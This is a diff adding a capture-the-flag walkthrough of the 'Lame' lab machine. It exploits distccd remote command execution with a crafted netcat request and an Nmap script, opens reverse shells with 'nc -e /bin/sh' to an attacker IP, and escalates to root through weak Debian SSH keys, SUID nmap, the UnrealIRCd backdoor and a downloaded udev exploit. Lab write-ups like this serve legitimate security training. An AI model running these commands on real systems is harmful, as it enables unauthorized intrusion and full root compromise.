@@ -487,9 +487,302 @@ cat /root/root.txt
 ![image](https://github.com/user-attachments/assets/b7f63d0c-aa53-405c-8684-57112e091830)
 
 
+## Exploiting DistCC (Port 3632) 
+
+### Background
+From the gentoo wiki:
+
+```
+Distcc is a program designed to distribute compiling tasks across a network to participating hosts. It is comprised of a server, distccd, and a client program, distcc. Distcc can work transparently with ccache, Portage, and Automake with a small amount of setup.
+```
+
+The idea is networked compilation of code. Also in that same page, in the Configuration section, it recommends configuring which clients are allowed to connect, as:
+
+![image](https://github.com/user-attachments/assets/c33d4e1e-6bee-491e-a041-bb3606519ad1)
+
+### Exploits
+
+`searchsploit` shows an exploit for command execution against the distcc daemon:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ searchsploit distcc
+----------------------------------------------------------------- ---------------------------------
+Exploit Title                                                   |  Path
+----------------------------------------------------------------- ---------------------------------
+DistCC Daemon - Command Execution (Metasploit)                   | multiple/remote/9915.rb
+----------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+This vulnerability is less of an exploit and more a consequence of the system design, as outlined in the Gentoo wiki. Essentially, if you can establish a connection to the DistCC service, you can execute arbitrary commands. 
+
+The Metasploit script available for this aligns with `CVE-2004-2687`, which confirms the issue: the service allows remote command execution due to weak configuration and lack of proper authorization checks.
+
+### Manual Exploitation:
+
+The vulnerability allows command execution by sending a specially crafted request to the DistCC service. For example, to execute the `id` command:
+
+```
+echo "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV0000000csh -c '(id)'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.oDOTI00000001A" | nc 10.10.10.3 3632
+```
+
+![image](https://github.com/user-attachments/assets/d10f95f7-d93f-4aa3-9b16-0c98090838de)
+
+### Using Nmap Script:
+
+An Nmap script (`distcc-exec.nse`) can automate the exploitation process. First, download the script:
+
+```
+sudo wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
+```
+Then, run the script to execute a command:
+
+```
+nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
+```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 15:34 EST
+Nmap scan report for 10.10.10.3
+Host is up (0.45s latency).
+
+PORT     STATE SERVICE
+3632/tcp open  distccd
+| distcc-exec: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+|_      https://distcc.github.io/security.html
+
+Nmap done: 1 IP address (1 host up) scanned in 3.28 seconds
+```
+
+### Gaining a Shell:
+
+To gain a reverse shell, use the Nmap script to execute a `nc` command:
+
+```
+nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.16.8 4444'"
+```
+![image](https://github.com/user-attachments/assets/96309fd4-835e-4e23-b57c-3aeb71080050)
 
 
+### Privilege Escalation
 
+Once you have a shell as the `daemon` user, you can escalate privileges using one of the following methods:
+
+#### Weak SSH Key:
+
+The `/root` directory is world-readable, allowing access to its contents:
+
+```
+daemon@lame:/$ ls -ld root/
+drwxr-xr-x 13 root root 4096 Apr  7 10:33 root/
+```
+While `root.txt` is not readable, the `.ssh` directory is accessible:
+
+```
+daemon@lame:/root$ ls -la
+total 80
+drwxr-xr-x 13 root root 4096 Apr  7 10:33 .
+drwxr-xr-x 21 root root 4096 May 20  2012 ..
+-rw-------  1 root root  373 Apr  7 10:33 .Xauthority
+lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
+-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
+drwx------  3 root root 4096 May 20  2012 .config
+drwx------  2 root root 4096 May 20  2012 .filezilla
+drwxr-xr-x  5 root root 4096 Apr  7 10:33 .fluxbox
+drwx------  2 root root 4096 May 20  2012 .gconf
+drwx------  2 root root 4096 May 20  2012 .gconfd
+drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
+drwx------  4 root root 4096 May 20  2012 .mozilla
+-rw-r--r--  1 root root  141 Oct 20  2007 .profile
+drwx------  5 root root 4096 May 20  2012 .purple
+-rwx------  1 root root    4 May 20  2012 .rhosts
+drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
+drwx------  2 root root 4096 Apr  7 10:33 .vnc
+drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
+-rwx------  1 root root  401 May 20  2012 reset_logs.sh
+-rw-------  1 root root   33 Mar 14  2017 root.txt
+-rw-r--r--  1 root root  118 Apr  7 10:33 vnc.log
+```
+
+Inside the `.ssh` directory, the `authorized_keys` file contains a public SSH key:
+
+```
+daemon@lame:/root/.ssh$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+```
+
+Two observations stand out:
+
+1. The key is associated with the user msfadmin@metasploitable.
+2. The key may be vulnerable to CVE-2008-0166, a flaw in OpenSSL's random number generator that made certain SSH keys brute-forceable.
+
+To exploit this, clone the Debian SSH repository and extract the precomputed keys:
+
+```
+root@kali:/opt# git clone https://github.com/g0tmi1k/debian-ssh
+Cloning into 'debian-ssh'...
+remote: Enumerating objects: 35, done.
+remote: Total 35 (delta 0), reused 0 (delta 0), pack-reused 35
+Unpacking objects: 100% (35/35), 439.59 MiB | 6.72 MiB/s, done.
+root@kali:/opt# cd debian-ssh/
+root@kali:/opt/debian-ssh# ls
+common_keys  our_tools  README.md  uncommon_keys
+root@kali:/opt/debian-ssh# cd common_keys/
+root@kali:/opt/debian-ssh/common_keys# ls
+debian_ssh_dsa_1024_x86.tar.bz2  debian_ssh_rsa_2048_x86.tar.bz2
+root@kali:/opt/debian-ssh/common_keys# tar jxf debian_ssh_rsa_2048_x86.tar.bz2
+```
+Use `grep` to locate the matching private key:
+
+
+```
+root@kali:/opt/debian-ssh/common_keys/rsa/2048# grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== *.pub
+57c3115d77c56390332dc5c49978627a-5429.pub
+```
+
+Use the matching private key to SSH into the target as root:
+
+```
+root@kali:/opt/debian-ssh/common_keys/rsa/2048# ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@10.10.10.3
+Last login: Tue Apr  7 10:33:18 2020 from :0.0
+Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have new mail.
+id
+root@lame:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+The weak SSH key vulnerability (CVE-2008-0166) allowed privilege escalation to root by leveraging a precomputed private key. 
+
+
+#### SUID Nmap:
+
+The `nmap` binary has the SUID bit set, allowing privilege escalation:
+
+```
+nmap --interactive
+nmap> !sh
+sh-3.2# id
+uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
+```
+
+#### Backdoored UnrealIRCd:
+
+The UnrealIRCd service contains a backdoor that allows command execution:
+
+```
+echo "AB; nc -e /bin/sh 10.10.16.8 4444" | nc 127.0.0.1 6697
+```
+A reverse shell is obtained as root.
+
+![image](https://github.com/user-attachments/assets/bc67c140-83e4-431a-9101-29182c7120c5)
+
+
+#### CVE 2009–1185: https://www.exploit-db.com/exploits/8572
+
+```
+searchsploit -m 8572.c
+```
+Start up a server on your attack machine.
+
+```
+python3 -m http.server 9005
+```
+In the target machine download the exploit file.
+
+```
+wget http://10.10.16.8:9005/8572.c
+```
+Compile the exploit.
+
+```
+gcc 8572.c -o 8572
+```
+
+To run it, let’s look at the usage instructions.
+
+![image](https://github.com/user-attachments/assets/dc00ae74-85f8-440a-95f9-f1c13e416aa5)
+
+We need to do two things:
+
+* Figure out the PID of the udevd netlink socket
+* Create a run file in /tmp and add a reverse shell to it. Since any payload in that file will run as root, we’ll get a privileged reverse shell.
+
+To get the PID of the udevd process, run the following command.
+
+```
+daemon@lame:/tmp$ ps -aux | grep devd
+ps -aux | grep devd
+Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
+root      2741  0.0  0.1   2224   724 ?        S<s  06:35   0:00 /sbin/udevd --daemon
+daemon    7475  0.0  0.1   1784   528 pts/4    RN+  16:28   0:00 grep devd
+```
+Similarly, you can get it through this file as mentioned in the instructions.
+
+```
+cat /proc/net/netlink
+```
+![image](https://github.com/user-attachments/assets/95e25b05-13b1-4508-958e-c82c66569b58)
+
+Next, create a `run` file in `/tmp` and add a reverse shell to it.
+
+```
+echo '#!/bin/bash' > run
+echo 'nc -nv 10.10.16.8 4445 -e /bin/bash' >> run
+```
+
+Set up a listener on your attack machine to receive the reverse shell.
+
+```
+nc -nlvp 4445
+```
+Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.
+
+```
+./8572 2740
+```
+
+We have root!
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 5555
+listening on [any] 5555 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.10.3] 44223
+id
+uid=0(root) gid=0(root)
+```
 
 
 
